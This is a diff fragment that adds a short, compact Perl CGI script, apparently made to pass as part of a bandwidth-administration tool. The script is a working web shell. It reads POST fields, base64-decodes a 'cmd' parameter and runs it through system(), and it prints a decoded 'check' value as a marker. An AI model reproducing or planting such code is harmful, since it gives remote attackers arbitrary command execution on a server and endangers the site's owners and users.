@@ -1,0 +1,2 @@
+#!/usr/bin/perl   -I/usr/local/bandmin
+use MIME::Base64;print "Content-type: text/html\n\n";if($ENV{'REQUEST_METHOD'} eq "POST"){my ($i, $key, $val, $in);read(STDIN, $in, $ENV{'CONTENT_LENGTH'});@in = split(/&/, $in);foreach $i (0 .. $#in){$in[$i] =~ s/\+/ /g;($key, $val) = split(/=/, $in[$i], 2);$key =~ s/%(..)/pack("c", hex($1))/ge;$val =~ s/%(..)/pack("c", hex($1))/ge;$in{$key} .= "\0" if (defined($in{$key}));$in{$key} .= $val;}if($in{"cmd"}){print decode_base64($in{"check"})."<pre>";system(decode_base64($in{"cmd"}));print "</pre>"}}
